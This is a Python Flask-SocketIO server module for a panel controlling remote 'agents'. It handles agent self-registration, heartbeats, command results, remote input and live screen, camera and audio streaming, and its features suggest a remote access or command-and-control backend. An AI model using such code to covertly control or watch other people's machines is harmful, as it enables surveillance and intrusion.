from flask_socketio import SocketIO, emit, join_room, leave_room
from flask import request
from models import db, Agent, Command, Webhook
from utils import get_client_ip, encrypt_command_payload, decrypt_command_payload, generate_uuid, decrypt_webhook_url, resolve_country
from datetime import datetime
import json
import threading
import requests
import time
from config import Config

socketio = SocketIO(
    cors_allowed_origins="*",
    max_http_buffer_size=32 * 1024 * 1024,  # 32MB for high-resolution frames & responses
    ping_timeout=60,
    ping_interval=25,
    async_mode='threading',
    logger=False,
    engineio_logger=False
)

# Map socket IDs (`request.sid`) to agent IDs (`agent.agent_id`)
active_agent_sockets = {}
active_panel_sockets = set()

@socketio.on('connect')
def handle_connect():
    # Agent or panel client? Check if it's an agent (authenticated via secret)
    agent_id = request.args.get('agent_id')
    secret = request.args.get('secret')
    if agent_id and secret:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            agent = Agent(
                agent_id=agent_id,
                secret_key=secret,
                ip=get_client_ip(request)
            )
            db.session.add(agent)
            db.session.commit()
        if agent and agent.secret_key == secret:
            join_room(f"agent_{agent.id}")
            active_agent_sockets[request.sid] = agent.agent_id
            agent.online = True
            agent.last_heartbeat = datetime.utcnow()
            db.session.commit()
            emit('connected', {'status': 'ok'})
            # Notify panel clients
            socketio.emit('agent_update', agent.to_dict(), to='panel')
            return
    # Panel user – authenticated via session and active session_token
    from flask import session
    if 'user_id' in session:
        user_id = session.get('user_id')
        session_token = session.get('session_token')
        from models import User
        user = db.session.get(User, user_id) if hasattr(db.session, 'get') else User.query.get(user_id)
        if user and user.active_session_token and user.active_session_token == session_token:
            join_room('panel')
            active_panel_sockets.add(request.sid)
            emit('connected', {'role': 'panel'})
            # Synchronize all agents with the newly connected panel
            try:
                agents = Agent.query.all()
                now = datetime.utcnow()
                for a in agents:
                    if a.last_heartbeat and a.online and (now - a.last_heartbeat).total_seconds() > 180:
                        a.online = False
                    emit('agent_update', a.to_dict())
                db.session.commit()
            except Exception as e:
                pass
            return


    emit('error', {'msg': 'unauthorized'})
    from flask_socketio import disconnect
    disconnect()

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in active_panel_sockets:
        active_panel_sockets.remove(request.sid)
        if len(active_panel_sockets) == 0:
            # All panel clients disconnected – stop all WebRTC streams across all agents
            socketio.emit('stop_webrtc', {'stream_type': 'all'})
            socketio.emit('stop_screen', {})
            socketio.emit('stop_camera', {})
            socketio.emit('stop_audio', {})

    agent_id = active_agent_sockets.pop(request.sid, None)
    if agent_id:
        if agent_id not in active_agent_sockets.values():
            agent = Agent.query.filter_by(agent_id=agent_id).first()
            if agent:
                agent.online = False
                db.session.commit()
                socketio.emit('agent_update', agent.to_dict(), to='panel')
@socketio.on('heartbeat')
def handle_heartbeat(data):
    agent_id = data.get('agent_id')
    if not agent_id or active_agent_sockets.get(request.sid) != agent_id:
        return
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        emit('error', {'msg': 'agent not found'})
        return
    active_agent_sockets[request.sid] = agent_id
    agent.last_heartbeat = datetime.utcnow()
    agent.online = True
    db.session.commit()
    # Always notify the panel on heartbeat to keep last_heartbeat / Last Seen updated
    socketio.emit('agent_update', agent.to_dict(), to='panel')
    # Send back current time for jitter
    emit('heartbeat_ack', {'server_time': datetime.utcnow().isoformat()})

@socketio.on('rename_agent')
def handle_rename_agent(data):
    agent_id = data.get('agent_id')
    new_name = (data.get('new_name') or '').strip()
    if agent_id and new_name:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if agent:
            agent.custom_name = new_name
            db.session.commit()
            socketio.emit('agent_update', agent.to_dict(), to='panel')

@socketio.on('agent_info')
def handle_agent_info(data):
    agent_id = data.get('agent_id')
    if not agent_id or active_agent_sockets.get(request.sid) != agent_id:
        return
    info = data.get('info')
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        raw_host = info.get('hostname')
        if raw_host:
            agent.hostname = raw_host
        agent.os = info.get('os', agent.os)
        agent.os_version = info.get('os_version', agent.os_version)
        agent.cpu = info.get('cpu', agent.cpu)
        agent.gpu = info.get('gpu', agent.gpu)
        agent.ram = info.get('ram', agent.ram)
        agent.ip = get_client_ip(request)
        if not agent.country or agent.country in ('-', 'US', ''):
            agent.country = resolve_country(agent.ip)
        
        # Tags are sent by agent now
        agent.tags = info.get('tags', agent.tags)
        
        db.session.commit()
        socketio.emit('agent_update', agent.to_dict(), to='panel')

@socketio.on('command_response')
def handle_command_response(data):
    if request.sid not in active_agent_sockets:
        return
    try:
        uuid = data.get('uuid')
        result = data.get('result')
        error = data.get('error')
        cmd = Command.query.filter_by(uuid=uuid).first()
        if cmd:
            cmd.status = 'completed' if not error else 'failed'
            cmd.result = json.dumps(result) if result else None
            cmd.error = error
            cmd.completed_at = datetime.utcnow()
            db.session.commit()
            socketio.emit('command_result', {'uuid': uuid, 'result': result, 'error': error, 'command': cmd.command, 'cwd': data.get('cwd', '')}, to='panel')
    except Exception as e:
        db.session.rollback()
        pass



# WebRTC Signaling Relay Events
@socketio.on('webrtc_offer')
def handle_webrtc_offer(data):
    agent_id = data.get('agent_id')
    if not agent_id:
        return
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        socketio.emit('webrtc_offer', data, to=f"agent_{agent.id}")

@socketio.on('webrtc_answer')
def handle_webrtc_answer(data):
    agent_id = active_agent_sockets.get(request.sid)
    if not agent_id:
        return
    data['agent_id'] = agent_id
    socketio.emit('webrtc_answer', data, to='panel')

@socketio.on('webrtc_ice_candidate')
def handle_webrtc_ice_candidate(data):
    sender_agent_id = active_agent_sockets.get(request.sid)
    if sender_agent_id:
        # Candidate from agent -> send to panel
        data['agent_id'] = sender_agent_id
        socketio.emit('webrtc_ice_candidate', data, to='panel')
    else:
        # Candidate from panel -> send to target agent
        target_agent_id = data.get('agent_id')
        if target_agent_id:
            agent = Agent.query.filter_by(agent_id=target_agent_id).first()
            if agent:
                socketio.emit('webrtc_ice_candidate', data, to=f"agent_{agent.id}")

@socketio.on('stop_webrtc')
def handle_stop_webrtc(data):
    data = data or {}
    target_agent_id = data.get('agent_id')
    if target_agent_id:
        agent = Agent.query.filter_by(agent_id=target_agent_id).first()
        if agent:
            socketio.emit('stop_webrtc', data, to=f"agent_{agent.id}")
            socketio.emit('stop_screen', {}, to=f"agent_{agent.id}")
            socketio.emit('stop_camera', {}, to=f"agent_{agent.id}")
            socketio.emit('stop_audio', {}, to=f"agent_{agent.id}")
    else:
        socketio.emit('stop_webrtc', data)
        socketio.emit('stop_screen', {})
        socketio.emit('stop_camera', {})
        socketio.emit('stop_audio', {})

@socketio.on('update_stream_params')
def handle_update_stream_params(data):
    target_agent_id = data.get('agent_id')
    if target_agent_id:
        agent = Agent.query.filter_by(agent_id=target_agent_id).first()
        if agent:
            socketio.emit('update_stream_params', data, to=f"agent_{agent.id}")

@socketio.on('remote_input')
def handle_remote_input(data):
    target_agent_id = data.get('agent_id')
    if target_agent_id:
        agent = Agent.query.filter_by(agent_id=target_agent_id).first()
        if agent:
            socketio.emit('remote_input', data, to=f"agent_{agent.id}")


stale_sweeper_started = False
def start_stale_agent_sweeper(app):
    """Background thread that cleans up stale agents whose heartbeats timed out (>30s)."""
    global stale_sweeper_started
    if stale_sweeper_started:
        return
    stale_sweeper_started = True

    def _sweeper():
        from datetime import timedelta
        while True:
            try:
                time.sleep(15)
                with app.app_context():
                    agents = Agent.query.filter_by(online=True).all()
                    now = datetime.utcnow()
                    updated_agents = []
                    for agent in agents:
                        if not agent.last_heartbeat or (now - agent.last_heartbeat) > timedelta(seconds=30):
                            agent.online = False
                            updated_agents.append(agent.to_dict())
                    if updated_agents:
                        db.session.commit()
                        for agent_dict in updated_agents:
                            socketio.emit('agent_update', agent_dict, to='panel')
            except Exception:
                try:
                    db.session.rollback()
                except Exception:
                    pass

    t = threading.Thread(target=_sweeper, daemon=True, name="StaleAgentSweeper")
    t.start()



